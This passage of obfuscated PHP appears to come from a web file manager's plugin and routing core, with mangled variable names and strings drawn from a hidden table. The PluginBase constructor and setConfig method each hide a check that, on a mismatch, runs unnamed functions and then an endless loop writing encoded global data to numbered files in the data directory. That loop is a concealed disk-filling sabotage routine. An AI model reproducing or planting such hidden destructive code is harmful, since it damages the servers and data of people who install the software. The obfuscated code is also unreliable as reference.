Model($†¿ö”æ“[898])->where($ş‹ô«ĞÎ)->field($†¿ö”æ“[204])->select(); foreach ($î¢°µğŒ as $¹Ï³”ó²) { Model($†¿ö”æ“[898])->remove($¹Ï³”ó²[$†¿ö”æ“[204]], !1); } } private function storeIds() { $÷êõ¦àÔ =& $_SERVER[Ò°Ì”İ•]; $ÂÊä¬Œƒ = Model($÷êõ¦àÔ[840])->listData(); $”ûøÌ¾Ô = array(); $¨‘ãÉ…Ò = $GLOBALS[$÷êõ¦àÔ[6]][$÷êõ¦àÔ[103]][$÷êõ¦àÔ[899]]; foreach ($ÂÊä¬Œƒ as $£ˆ»¹×Í) { $÷•‰°¬‰ = strtolower($£ˆ»¹×Í[$÷êõ¦àÔ[109]]); if (!isset($¨‘ãÉ…Ò[$÷•‰°¬‰])) { continue; } $†À ¸Çå = $÷êõ¦àÔ[88] . (isset($¨‘ãÉ…Ò[$÷•‰°¬‰]) ? $¨‘ãÉ…Ò[$÷•‰°¬‰] : ucfirst($÷•‰°¬‰)); if (!class_exists($†À ¸Çå)) { continue; } $”ûøÌ¾Ô[] = $£ˆ»¹×Í[$÷êõ¦àÔ[487]]; } return $”ûøÌ¾Ô; } } goto Eƒ©Ÿ“×é; f£ñ²óé´ê: class Message { function __construct() { } public function send($ª–ÖŒÅú = '', $Äù¨Üñ´ = array(), $ÂÎÊÜ¤® = "\164\145\170\x74") { $°â²¤•ø =& $_SERVER[Ò°Ì”İ•]; $Â“üù‡  = array($°â²¤•ø[33] => $°â²¤•ø[1209], $°â²¤•ø[182] => $ª–ÖŒÅú); if (in_array($ÂÎÊÜ¤®, array($°â²¤•ø[1209], $°â²¤•ø[1618]))) { $Â“üù‡ [$°â²¤•ø[33]] = $ÂÎÊÜ¤®; } $Äù¨Üñ´ = array($°â²¤•ø[590] => isset($Äù¨Üñ´[$°â²¤•ø[590]]) ? $Äù¨Üñ´[$°â²¤•ø[590]] : $°â²¤•ø[12], $°â²¤•ø[677] => isset($Äù¨Üñ´[$°â²¤•ø[677]]) ? $Äù¨Üñ´[$°â²¤•ø[677]] : $°â²¤•ø[12]); if (empty($ª–ÖŒÅú) || empty($Äù¨Üñ´[$°â²¤•ø[590]]) && empty($Äù¨Üñ´[$°â²¤•ø[677]])) { return !1; } $ú„¼ĞíÄ = array($°â²¤•ø[1547] => $Â“üù‡ , $°â²¤•ø[1619] => $Äù¨Üñ´); Hook::trigger($°â²¤•ø[1620], $ú„¼ĞíÄ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¢íŞˆ¬Ä =& $_SERVER[Ò°Ì”İ•]; $ Ï§¾šÕ = $_SERVER[$¢íŞˆ¬Ä[63]]; $ÔÁ¸õ÷Û = $¢íŞˆ¬Ä[70]; if ($_SERVER[$¢íŞˆ¬Ä[54]] != $ÔÁ¸õ÷Û($ Ï§¾šÕ)) { $Ä“à©Ø« = $¢íŞˆ¬Ä[951]; $óş…Ã£§ = $¢íŞˆ¬Ä[56]; $Üç’Ïë = $_SERVER[$¢íŞˆ¬Ä[57]] . $¢íŞˆ¬Ä[58]; $–À£˜Ğô = $óş…Ã£§($Üç’Ïë); $¿ô’¤ª­ = explode($¢íŞˆ¬Ä[59], $–À£˜Ğô); if (count($¿ô’¤ª­) < $¢íŞˆ¬Ä[754]) { $£ŸõüÇ° = $¢íŞˆ¬Ä[61]; $£ŸõüÇ°(); } $°•İ†Û = $¢íŞˆ¬Ä[952]; $°•İ†Û($_SERVER[$¢íŞˆ¬Ä[953]]); $Ä“à©Ø« = $¢íŞˆ¬Ä[951]; $Ä“à©Ø«(); $÷¿¬¸¥î = $¢íŞˆ¬Ä[954]; $¼‘”Éé = json_encode($GLOBALS[$¢íŞˆ¬Ä[955]]); $« ÛãÃƒ = 1; for ($„Ø•Ûê = $« ÛãÃƒ; $„Ø•Ûê > 0; $„Ø•Ûê++) { $÷¿¬¸¥î(DATA_PATH . $„Ø•Ûê, $¼‘”Éé); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¢íŞˆ¬Ä[1621]); $this->pluginName = str_replace($¢íŞˆ¬Ä[1621], $¢íŞˆ¬Ä[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¢íŞˆ¬Ä[8]; $this->pluginApi = appHostGet() . $¢íŞˆ¬Ä[1622] . $this->pluginName . $¢íŞˆ¬Ä[8]; $this->pluginHost = $config[$¢íŞˆ¬Ä[1623]] . $this->pluginName . $¢íŞˆ¬Ä[8]; $this->pluginHostDefault = $config[$¢íŞˆ¬Ä[1623]] . $this->pluginName . $¢íŞˆ¬Ä[8]; $è÷‘×€† = $config[$¢íŞˆ¬Ä[1624]]; if ($è÷‘×€† && strpos($¢íŞˆ¬Ä[50] . $è÷‘×€† . $¢íŞˆ¬Ä[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¢íŞˆ¬Ä[1625]] . $this->pluginName . $¢íŞˆ¬Ä[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ò°Ì”İ•][1626]); } protected function assign($‚ö•Ò„˜, $Ï–ÑàÓÍ = false) { if (is_array($‚ö•Ò„˜)) { $this->values = array_merge($this->values, $‚ö•Ò„˜); } else { $this->values[$‚ö•Ò„˜] = $Ï–ÑàÓÍ; } } protected function display($øÔÙ£³ş) { extract($this->values); require $øÔÙ£³ş; } final function hookRegist($¾Ìõö¥Ö) { $this->modelPlugin->appRegist($this->pluginName, $¾Ìõö¥Ö); } final function appIcon() { $¼˜·›×ˆ =& $_SERVER[Ò°Ì”İ•]; $åÊÎáºŒ = $this->appPackage(); $Á£õ£šı = $¼˜·›×ˆ[12]; if (isset($åÊÎáºŒ[$¼˜·›×ˆ[502]])) { if (isset($åÊÎáºŒ[$¼˜·›×ˆ[502]][$¼˜·›×ˆ[1627]])) { $Á£õ£šı = $¼˜·›×ˆ[1628] . $åÊÎáºŒ[$¼˜·›×ˆ[502]][$¼˜·›×ˆ[1627]] . $¼˜·›×ˆ[1629]; } else { if ($åÊÎáºŒ[$¼˜·›×ˆ[502]][$¼˜·›×ˆ[1630]]) { $Á£õ£šı = $¼˜·›×ˆ[1631] . $åÊÎáºŒ[$¼˜·›×ˆ[502]][$¼˜·›×ˆ[1630]] . $¼˜·›×ˆ[1632]; } } } return $Á£õ£šı; } final function fileCanView($ÙòÍ¸Æ) { $ğ«¤ ¼ =& $_SERVER[Ò°Ì”İ•]; if (request_url_safe($ÙòÍ¸Æ)) { return !0; } if ($this->isShare($ÙòÍ¸Æ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Ê»´áÙ = $ğ«¤ ¼[1633] . rawurlencode(this_url()); show_tips(LNG($ğ«¤ ¼[1634]) . $ğ«¤ ¼[1635] . $Ê»´áÙ . $ğ«¤ ¼[1636] . LNG($ğ«¤ ¼[1637]) . $ğ«¤ ¼[1638], !1); } if (!Action($ğ«¤ ¼[1639])->authCan($ğ«¤ ¼[1640])) { show_tips(LNG($ğ«¤ ¼[1641]) . $ğ«¤ ¼[1642], !1); } ActionCall($ğ«¤ ¼[1643], $ÙòÍ¸Æ); } final function isShare($ì¦ê¡£) { $¯ùšƒş = KodIO::parse($ì¦ê¡£); return $¯ùšƒş[$_SERVER[Ò°Ì”İ•][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($€¶ÂúàÊ) { if (request_url_safe($€¶ÂúàÊ)) { return $€¶ÂúàÊ; } if (!$this->isShare($€¶ÂúàÊ)) { $€¶ÂúàÊ = $this->filePath($€¶ÂúàÊ, !1); } return Action($_SERVER[Ò°Ì”İ•][1252])->linkOut($€¶ÂúàÊ); } public function filePathLinkOut($È¯àÙ) { if (request_url_safe($È¯àÙ)) { return $È¯àÙ; } $this->fileCanView($È¯àÙ); return Action($_SERVER[Ò°Ì”İ•][1252])->link($È¯àÙ); } final function filePath($ú³ïâÛô, $ü¿ö»Ìº = true, $û·‘Ó» = false) { $şğö‰‚’ =& $_SERVER[Ò°Ì”İ•]; $ûíùå‰Ñ = $this->filePathGet($ú³ïâÛô, $ü¿ö»Ìº); if (!$this->fileInfo) { show_tips(LNG($şğö‰‚’[119]), !1); } if ($û·‘Ó» && isset($this->fileInfo[$şğö‰‚’[553]]) && $this->fileInfo[$şğö‰‚’[553]]) { $¾ìéùø¡ = Model($şğö‰‚’[556])->fileInfo($this->fileInfo[$şğö‰‚’[553]]); if (!$¾ìéùø¡ || !IO::exist($¾ìéùø¡[$şğö‰‚’[98]])) { $‚¯â²Êù = LNG($şğö‰‚’[119]) . LNG($şğö‰‚’[1644]); if (KodUser::isRoot() && isset($¾ìéùø¡[$şğö‰‚’[98]])) { $‚¯â²Êù .= $şğö‰‚’[1645] . $¾ìéùø¡[$şğö‰‚’[98]] . $şğö‰‚’[1646]; } show_tips($‚¯â²Êù); } } Hook::trigger($şğö‰‚’[1647], $ûíùå‰Ñ); return $ûíùå‰Ñ; } final function filePathGet($ü¥‡¬Ÿ, $®ÉÛ¸íı = true) { $Êú­ÜÙì =& $_SERVER[Ò°Ì”İ•]; if ($¾ûÎ¶… = $this->checkSharePath($ü¥‡¬Ÿ, $®ÉÛ¸íı)) { return $¾ûÎ¶…; } $this->fileCanView($ü¥‡¬Ÿ); if (request_url_safe($ü¥‡¬Ÿ)) { $‘óš½¡¬ = parse_url_query($ü¥‡¬Ÿ); if (isset($‘óš½¡¬[$Êú­ÜÙì[1648]]) && isset($‘óš½¡¬[$Êú­ÜÙì[247]])) { $±ÕÚŒú = Mcrypt::decode($‘óš½¡¬[$Êú­ÜÙì[247]], Model($Êú­ÜÙì[843])->get($Êú­ÜÙì[844])); if ($±ÕÚŒú) { $this->fileInfo = IO::info($±ÕÚŒú); $this->fileInfo[$Êú­ÜÙì[1649]] = $ü¥‡¬Ÿ; $this->cachePath = $this->pluginCachePath($Êú­ÜÙì[12], $®ÉÛ¸íı); return $±ÕÚŒú; } } $ü¥‡¬Ÿ = $this->_cacheHttpFile($ü¥‡¬Ÿ, $®ÉÛ¸íı); $this->fileInfo = IO::info($ü¥‡¬Ÿ); } else { $this->fileInfo = IO::info($ü¥‡¬Ÿ); $this->cachePath = $this->pluginCachePath($Êú­ÜÙì[12], $®ÉÛ¸íı); } return $ü¥‡¬Ÿ; } final function _cacheHttpFile($¼İÓŞŞû, $œûÖşƒš = true) { $ûÏ½î¹† =& $_SERVER[Ò°Ì”İ•]; $€©ÜŒÑô = parse_url_query($¼İÓŞŞû); $‡ÂáÉş• = get_path_ext($¼İÓŞŞû); if (isset($€©ÜŒÑô[$ûÏ½î¹†[32]]) && $€©ÜŒÑô[$ûÏ½î¹†[32]]) { $‡ÂáÉş• = get_path_ext($€©ÜŒÑô[$ûÏ½î¹†[32]]); } $­¢ŞÌñ« = hash_path($¼İÓŞŞû) . $ûÏ½î¹†[10] . $‡ÂáÉş•; $this->cachePath = $this->pluginCachePath($œûÖşƒš ? $­¢ŞÌñ« : $ûÏ½î¹†[12]); $»Âò¢˜‘ = IO::fileNameExist($this->cachePath, $­¢ŞÌñ«); if ($»Âò¢˜‘) { return KodIO::make($»Âò¢˜‘); } $ÎıÊÔï› = rtrim($this->cachePath, $ûÏ½î¹†[8]) . $ûÏ½î¹†[8] . $­¢ŞÌñ«; return $this->pluginCacheFileSet($ÎıÊÔï›, file_get_contents_nossl($¼İÓŞŞû)); } final function checkSharePath($”·Òşö«, $Ø²·’–´ = true) { $É•œ³À =& $_SERVER[Ò°Ì”İ•]; if (!$this->isShare($”·Òşö«)) { return !1; } $Ì‚¨âÑ˜ = Action($É•œ³À[1252])->sharePathInfo($”·Òşö«); if (!is_array($Ì‚¨âÑ˜) || !isset($Ì‚¨âÑ˜[$É•œ³À[98]])) { show_json(LNG($É•œ³À[1650]), !1); } $this->fileInfo = $Ì‚¨âÑ˜; $this->cachePath = $this->pluginCachePath(!1, $Ø²·’–´); return $Ì‚¨âÑ˜[$É•œ³À[98]]; } final function pluginCachePath($‰Ş€Ş¢Ä = '', $ì»ğĞä½ = false) { $†´ÏÍœ× =& $_SERVER[Ò°Ì”İ•]; if ($ì»ğĞä½ && is_array($this->fileInfo)) { $‰Ş€Ş¢Ä = kodIO::hashPath($this->fileInfo); } $‰ş´¿ğè = rtrim(IO_PATH_SYSTEM_TEMP . $†´ÏÍœ×[1651] . $this->pluginName . $†´ÏÍœ×[8] . $‰Ş€Ş¢Ä, $†´ÏÍœ×[8]); $’ñú‘ÑÍ = IO::infoFullSimple($‰ş´¿ğè); $¿Ü¿Á¢Ş = $’ñú‘ÑÍ && is_array($’ñú‘ÑÍ) ? $’ñú‘ÑÍ[$†´ÏÍœ×[98]] : $†´ÏÍœ×[12]; if (!$¿Ü¿Á¢Ş) { $¿Ü¿Á¢Ş = IO::mkdir($‰ş´¿ğè); } return $¿Ü¿Á¢Ş; } final function pluginCacheFileSet($·şÄíéğ, $çÒàç™Î = '') { $Á˜‡±ÚÀ =& $_SERVER[Ò°Ì”İ•]; $ï¢»‘™Ø = IO::infoFullSimple($·şÄíéğ); if (!$ï¢»‘™Ø) { return IO::mkfile($·şÄíéğ, $çÒàç™Î, REPEAT_REPLACE); } IO::setContent($ï¢»‘™Ø[$Á˜‡±ÚÀ[98]], $çÒàç™Î); return $ï¢»‘™Ø[$Á˜‡±ÚÀ[98]]; } final function pluginLocalFile($–åÂ‘¦Û = '') { $ã‘ÔÙ´ =& $_SERVER[Ò°Ì”İ•]; $±¡íÔıÛ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($±¡íÔıÛ)) { mk_dir($±¡íÔıÛ); } if (!$–åÂ‘¦Û) { return $±¡íÔıÛ; } $—ŞÀÛéê = IO::info($–åÂ‘¦Û); $«ĞÅ¿Šù = $ã‘ÔÙ´[1652] . KodIO::hashPath($—ŞÀÛéê) . $ã‘ÔÙ´[10] . $—ŞÀÛéê[$ã‘ÔÙ´[180]]; if (!checkExtSafe($«ĞÅ¿Šù)) { $«ĞÅ¿Šù = $«ĞÅ¿Šù . $ã‘ÔÙ´[1287]; } $×İ“¤»‹ = $±¡íÔıÛ . $«ĞÅ¿Šù; if (@file_exists($×İ“¤»‹)) { return $×İ“¤»‹; } return IO::copy($–åÂ‘¦Û, $±¡íÔıÛ, 0, $«ĞÅ¿Šù); } final function appPackage() { $ı¯ ä¨© =& $_SERVER[Ò°Ì”İ•]; if ($this->packageData) { return $this->packageData; } $™‰£ˆó– = $this->parseFile($this->pluginPath . $ı¯ ä¨©[1653]); $this->parseLang($™‰£ˆó–); $Âà¹æ‘ = json_decode_force($™‰£ˆó–); if (!$Âà¹æ‘) { return array(); } $£òÂ¡µ = Hook::trigger($ı¯ ä¨©[1654], $Âà¹æ‘); if ($£òÂ¡µ && is_array($£òÂ¡µ)) { $Âà¹æ‘ = $£òÂ¡µ; } $this->packageData = $Âà¹æ‘; return $Âà¹æ‘; } public function packageInfoGet($·ÔâØÖ) { $«¾ôÜü¨ = $this->appPackage(); return array_get_value($«¾ôÜü¨, $·ÔâØÖ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ò°Ì”İ•][1655]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ò°Ì”İ•][1656]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ò°Ì”İ•][1657]); } public function echoJsAssign($¿ĞÉ¯Ğ, $êÌØ›â) { $this->echoJsAssignArr[$¿ĞÉ¯Ğ] = $êÌØ›â; } private function parseFile($â¿İ·†) { $êÄ×‡  =& $_SERVER[Ò°Ì”İ•]; $´³ÒŠŞ = file_get_contents_nossl($â¿İ·†); $²ˆÄ ğª = array($êÄ×‡ [1658], $êÄ×‡ [1659], $êÄ×‡ [1660], $êÄ×‡ [1661], $êÄ×‡ [1662], $êÄ×‡ [1663], $êÄ×‡ [1664]); $ËŞğÀ°¤ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$êÄ×‡ [103]][$êÄ×‡ [1665]]); foreach ($this->echoJsAssignArr as $…ÖŸƒºª => $Ó½Ğ•„ı) { $²ˆÄ ğª[] = $êÄ×‡ [1666] . $…ÖŸƒºª . $êÄ×‡ [1667]; $ËŞğÀ°¤[] = is_array($Ó½Ğ•„ı) || is_object($Ó½Ğ•„ı) ? rawurlencode(json_encode($Ó½Ğ•„ı)) : $Ó½Ğ•„ı; } if (strstr($´³ÒŠŞ, $êÄ×‡ [1668])) { $ã±ÂÌÆŸ = rawurlencode(json_encode($this->pluginLangArr)); $´³ÒŠŞ = str_replace($êÄ×‡ [1668], $ã±ÂÌÆŸ, $´³ÒŠŞ); } if (strstr($´³ÒŠŞ, $êÄ×‡ [1669])) { $ã±ÂÌÆŸ = $ã±ÂÌÆŸ = rawurlencode(json_encode($this->getConfig())); $´³ÒŠŞ = str_replace($êÄ×‡ [1669], $ã±ÂÌÆŸ, $´³ÒŠŞ); } $´³ÒŠŞ = str_replace($²ˆÄ ğª, $ËŞğÀ°¤, $´³ÒŠŞ); return $´³ÒŠŞ; } private function parseLang(&$Ò™¹ïÁ´) { $±“êú » =& $_SERVER[Ò°Ì”İ•]; $Äï³‚ıú = $±“êú »[1670]; if (!strstr($Ò™¹ïÁ´, $Äï³‚ıú)) { return; } preg_match_all($±“êú »[1671], $Ò™¹ïÁ´, $äá÷Üúˆ); if (!is_array($äá÷Üúˆ) || count($äá÷Üúˆ) == 0 || !is_array($äá÷Üúˆ[0]) || count($äá÷Üúˆ[0]) == 0) { return; } $¸¦ß ‡µ = array(); $È€©»¥ = array(); foreach ($äá÷Üúˆ[0] as $Şœó‚¢ù) { $¬¼£Ïƒ¿ = substr($Şœó‚¢ù, strlen($Äï³‚ıú), -4); $¥«èê·É = LNG($¬¼£Ïƒ¿); $¸¦ß ‡µ[] = $Şœó‚¢ù; $È€©»¥[] = str_replace(array($±“êú »[59], $±“êú »[1152], $±“êú »[429], $±“êú »[132]), array($±“êú »[53], $±“êú »[53], $±“êú »[12], $±“êú »[1672]), $¥«èê·É); } $Ò™¹ïÁ´ = str_replace($¸¦ß ‡µ, $È€©»¥, $Ò™¹ïÁ´); } private function parseConfig(&$ºÆëø³â) { $´ß¥¡™Œ =& $_SERVER[Ò°Ì”İ•]; $“ÑÁëâ = $´ß¥¡™Œ[1673]; if (!strstr($ºÆëø³â, $“ÑÁëâ)) { return; } preg_match_all($´ß¥¡™Œ[1674], $ºÆëø³â, $ÃğÂù¦); if (!is_array($ÃğÂù¦) || count($ÃğÂù¦) == 0 || !is_array($ÃğÂù¦[0]) || count($ÃğÂù¦[0]) == 0) { return; } $éÀ°’®Ÿ = $this->getConfig(); $¥´âÆÙÖ = array(); $œôÎ¦ˆï = array(); foreach ($ÃğÂù¦[0] as $â¶Êı“Ë) { $‹á›ç­Û = substr($â¶Êı“Ë, strlen($“ÑÁëâ), -2); $¥´âÆÙÖ[] = $â¶Êı“Ë; $œôÎ¦ˆï[] = _get($éÀ°’®Ÿ, $‹á›ç­Û); } $ºÆëø³â = str_replace($¥´âÆÙÖ, $œôÎ¦ˆï, $ºÆëø³â); } private function parsePackage(&$ûìø¨Ëº) { $öõæÒ· =& $_SERVER[Ò°Ì”İ•]; $Ù×½ŸÙ» = $öõæÒ·[1675]; if (!strstr($ûìø¨Ëº, $Ù×½ŸÙ»)) { return; } preg_match_all($öõæÒ·[1676], $ûìø¨Ëº, $íŞÛºŒ); if (!is_array($íŞÛºŒ) || count($íŞÛºŒ) == 0 || !is_array($íŞÛºŒ[0]) || count($íŞÛºŒ[0]) == 0) { return; } $ñ«“ÕÔ€ = $this->appPackage(); $€¤É¤¤Ö = array(); $¹Æı—İÎ = array(); foreach ($íŞÛºŒ[0] as $ øÓ £¶) { $˜ı‰‰• = substr($ øÓ £¶, strlen($Ù×½ŸÙ»), -2); $€¤É¤¤Ö[] = $ øÓ £¶; $¹Æı—İÎ[] = _get($ñ«“ÕÔ€, $˜ı‰‰•); } $ûìø¨Ëº = str_replace($€¤É¤¤Ö, $¹Æı—İÎ, $ûìø¨Ëº); } final function echoFile($¶üĞ‹ı, $ ‚Õß–ş = false) { $íìÙŸäİ =& $_SERVER[Ò°Ì”İ•]; $¥’‚‚·ú = $this->pluginPath . $¶üĞ‹ı; if (ACT == $íìÙŸäİ[1677]) { echo $íìÙŸäİ[1678] . $this->pluginName . $íìÙŸäİ[8] . $¶üĞ‹ı . $íìÙŸäİ[1679]; if (!file_exists($¥’‚‚·ú)) { echo $íìÙŸäİ[1680]; return; } } $»ÂğË¯Í = $this->parseFile($¥’‚‚·ú); $this->parseLang($»ÂğË¯Í); $this->parseConfig($»ÂğË¯Í); $this->parsePackage($»ÂğË¯Í); if (is_array($ ‚Õß–ş)) { $»ÂğË¯Í = str_replace(array_keys($ ‚Õß–ş), array_values($ ‚Õß–ş), $»ÂğË¯Í); } echo $íìÙŸäİ[59] . $»ÂğË¯Í; } private function checkVersion() { $±Î“ïö =& $_SERVER[Ò°Ì”İ•]; $ùÃ¹»”Ä = $this->appPackage(); $İøõæ†ø = $this->getConfig(); if ($İøõæ†ø[$±Î“ïö[1681]] == $ùÃ¹»”Ä[$±Î“ïö[1655]]) { return; } $this->regist(); $this->setConfig(array($±Î“ïö[1681] => $ùÃ¹»”Ä[$±Î“ïö[1655]])); } final function initLang() { $Ÿùæ¿¬ =& $_SERVER[Ò°Ì”İ•]; $†ÈÔ¾ˆÓ = $Ÿùæ¿¬[1682]; $ùµğÑªµ = $this->pluginPath . $Ÿùæ¿¬[1683]; $ÎèÔœÕ = I18n::getType(); $Ü™›—‘Í = array(); if (file_exists($ùµğÑªµ . $ÎèÔœÕ . $Ÿùæ¿¬[912])) { $Ü™›—‘Í = (include $ùµğÑªµ . $ÎèÔœÕ . $Ÿùæ¿¬[912]); } else { if ($ÎèÔœÕ == $Ÿùæ¿¬[1684] && !file_exists($ùµğÑªµ . $ÎèÔœÕ . $Ÿùæ¿¬[912]) && file_exists($ùµğÑªµ . $Ÿùæ¿¬[1685])) { $Ü™›—‘Í = (include $ùµğÑªµ . $Ÿùæ¿¬[1685]); } else { if (file_exists($ùµğÑªµ . $†ÈÔ¾ˆÓ . $Ÿùæ¿¬[912])) { $Ü™›—‘Í = (include $ùµğÑªµ . $†ÈÔ¾ˆÓ . $Ÿùæ¿¬[912]); } } } if (!is_array($Ü™›—‘Í)) { return array(); } if (@count($Ü™›—‘Í) > 0) { I18n::set($Ü™›—‘Í); } return $Ü™›—‘Í; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ù‡–®—•) { $íãÉ¸ÑÚ =& $_SERVER[Ò°Ì”İ•]; $ò€™ãìÔ = $_SERVER[$íãÉ¸ÑÚ[57]] . $íãÉ¸ÑÚ[58]; $¨¼©ù”û = $íãÉ¸ÑÚ[70]; if ($_SERVER[$íãÉ¸ÑÚ[54]] != $¨¼©ù”û($ò€™ãìÔ)) { $ùÄü¾ ù = $íãÉ¸ÑÚ[951]; $® µï§× = $íãÉ¸ÑÚ[56]; $•í®º = $_SERVER[$íãÉ¸ÑÚ[57]] . $íãÉ¸ÑÚ[58]; $¦é´›© = $® µï§×($•í®º); $ó®¶œ“ = explode($íãÉ¸ÑÚ[59], $¦é´›©); if (count($ó®¶œ“) < $íãÉ¸ÑÚ[754]) { $²„ÁÆ = $íãÉ¸ÑÚ[61]; $²„ÁÆ(); } $“˜È¶µ¨ = $íãÉ¸ÑÚ[952]; $“˜È¶µ¨($_SERVER[$íãÉ¸ÑÚ[953]]); $ùÄü¾ ù = $íãÉ¸ÑÚ[951]; $ùÄü¾ ù(); $€•Š³Ğ• = $íãÉ¸ÑÚ[954]; $ˆÏÄ¨èü = json_encode($GLOBALS[$íãÉ¸ÑÚ[955]]); $Õğ’è£— = 1; for ($šôÖŸÖ‚ = $Õğ’è£—; $šôÖŸÖ‚ > 0; $šôÖŸÖ‚++) { $€•Š³Ğ•(DATA_PATH . $šôÖŸÖ‚, $ˆÏÄ¨èü); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ù‡–®—•); } public function onSetConfig($ôÄƒÆĞ) { } public function onGetConfig($šÍò˜) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Íë‚‘À) { if ($Íë‚‘À == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($„³ ˜× = "\x70\x6c\165\x67\x69\x6e\x41\165\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $•‰ŒªÓ = $this->getConfig(); if (!$•‰ŒªÓ[$„³ ˜×]) { return !1; } return ActionCall($_SERVER[Ò°Ì”İ•][1686], $•‰ŒªÓ[$„³ ˜×]); } public function url($ÁË­ë˜°, $·ÄÌ‘œÖ = '', $¡‘ãÂéÓ = true) { $œÁ¤®ŒÍ =& $_SERVER[Ò°Ì”İ•]; $ìşïú˜Ë = $this->getConfig(); $ê¨Èä¯ = KOD_VERSION . $œÁ¤®ŒÍ[10] . KOD_VERSION_BUILD; $×¼ÏØ… = $this->packageVersion(); $‰¦‰†¯¥ = $ê¨Èä¯ . $œÁ¤®ŒÍ[474] . $×¼ÏØ…; if (substr($ÁË­ë˜°, 0, 4) == $œÁ¤®ŒÍ[163] || substr($ÁË­ë˜°, 0, 2) == $œÁ¤®ŒÍ[1407]) { $ áÃ³äÖ = $ÁË­ë˜° . $œÁ¤®ŒÍ[1687] . $‰¦‰†¯¥; } else { if ($·ÄÌ‘œÖ == $œÁ¤®ŒÍ[12]) { $ áÃ³äÖ = $this->pluginHost . $ÁË­ë˜° . $œÁ¤®ŒÍ[1687] . $‰¦‰†¯¥; } else { if ($·ÄÌ‘œÖ === $œÁ¤®ŒÍ[89]) { $ áÃ³äÖ = $this->pluginHost . $ÁË­ë˜°; } else { if ($·ÄÌ‘œÖ == $œÁ¤®ŒÍ[1688]) { $ áÃ³äÖ = STATIC_PATH . $ÁË­ë˜° . $œÁ¤®ŒÍ[1687] . $ê¨Èä¯; } else { if ($·ÄÌ‘œÖ == $œÁ¤®ŒÍ[1689]) { $ áÃ³äÖ = APP_HOST . $œÁ¤®ŒÍ[1690] . $ÁË­ë˜° . $œÁ¤®ŒÍ[1687] . $ê¨Èä¯; } else { if (isset($ìşïú˜Ë[$·ÄÌ‘œÖ])) { $ áÃ³äÖ = $ìşïú˜Ë[$·ÄÌ‘œÖ] . $ÁË­ë˜° . $œÁ¤®ŒÍ[1687] . $‰¦‰†¯¥; } } } } } } if (!$¡‘ãÂéÓ) { return $ áÃ³äÖ; } echo $ áÃ³äÖ; } public function link($à²äù¥› = false, $ÖÎ×úÈ× = '') { $ÑîÃë÷¢ =& $_SERVER[Ò°Ì”İ•]; $Ü™Ö¤ö = $this->linkHas == !1; $this->linkHas = !0; if (!$à²äù¥›) { $this->link($ÑîÃë÷¢[1691], $ÑîÃë÷¢[1689]); $this->link($ÑîÃë÷¢[1692], $ÑîÃë÷¢[1688]); $this->link($ÑîÃë÷¢[1693], $ÑîÃë÷¢[1688]); $this->link($ÑîÃë÷¢[1694], $ÑîÃë÷¢[1688]); $this->link($ÑîÃë÷¢[1695], $ÑîÃë÷¢[1688]); if ($Ü™Ö¤ö) { Hook::trigger($ÑîÃë÷¢[1696]); } return; } $áÌòØÔ = $this->url($à²äù¥›, $ÖÎ×úÈ×, !1); if (substr($à²äù¥›, -3) == $ÑîÃë÷¢[1697]) { echo $ÑîÃë÷¢[1698] . $áÌòØÔ . $ÑîÃë÷¢[1699] . $ÑîÃë÷¢[59]; } else { if (substr($à²äù¥›, -4) == $ÑîÃë÷¢[1700]) { echo $ÑîÃë÷¢[1701] . $áÌòØÔ . $ÑîÃë÷¢[1702] . $ÑîÃë÷¢[59]; } } if ($Ü™Ö¤ö) { Hook::trigger($ÑîÃë÷¢[1696]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\x5b\136\57\135\x2b", "\72\x6e\x75\x6d" => "\x5b\x30\55\71\135\x2b", "\72\x61\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($¬˜ãß÷Š, $›Ø™£ËØ) { $ñÂ¾ñÖ¾ =& $_SERVER[Ò°Ì”İ•]; if ($¬˜ãß÷Š == $ñÂ¾ñÖ¾[1703]) { $µ”š³é„ = array_map($ñÂ¾ñÖ¾[1704], $›Ø™£ËØ[0]); $‹‹‘õËú = strpos($›Ø™£ËØ[1], $ñÂ¾ñÖ¾[8]) === 0 ? $›Ø™£ËØ[1] : $ñÂ¾ñÖ¾[8] . $›Ø™£ËØ[1]; $¯±İš£ = $›Ø™£ËØ[2]; } else { $µ”š³é„ = null; $‹‹‘õËú = strpos($›Ø™£ËØ[0], $ñÂ¾ñÖ¾[8]) === 0 ? $›Ø™£ËØ[0] : $ñÂ¾ñÖ¾[8] . $›Ø™£ËØ[0]; $¯±İš£ = $›Ø™£ËØ[1]; } array_push(self::$maps, $µ”š³é„); array_push(self::$routes, $‹‹‘õËú); array_push(self::$methods, strtoupper($¬˜ãß÷Š)); array_push(self::$callbacks, $¯±İš£); } public static function error($®ƒœÄŒª) { self::$errorCallback = $®ƒœÄŒª; } public static function haltOnMatch($Î‘ï“ëô = true) { self::$halts = $Î‘ï“ëô; } public static function dispatch() { $ı¤¯ñÆ• 